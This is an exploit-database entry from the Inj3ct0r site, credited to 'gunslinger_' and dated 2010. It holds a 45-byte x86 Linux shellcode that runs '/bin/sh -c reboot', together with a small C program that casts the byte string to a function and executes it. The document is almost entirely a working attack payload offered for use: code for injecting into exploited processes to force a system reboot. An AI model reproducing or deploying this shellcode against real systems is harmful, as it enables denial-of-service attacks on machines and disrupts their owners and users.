1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1


/*
Name   : 45 bytes sys_execve("/bin/sh", "-c", "reboot") x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

int main(void)
{
	char dark[] = "\x6a\x0b\x58\x99\x52\x68\x6f\x74\x20\x20\x68\x72\x65\x62\x6f"
		      "\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68"
		      "\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80";

	void(*door)()=(void*)dark;
	door();

  	return 0;
}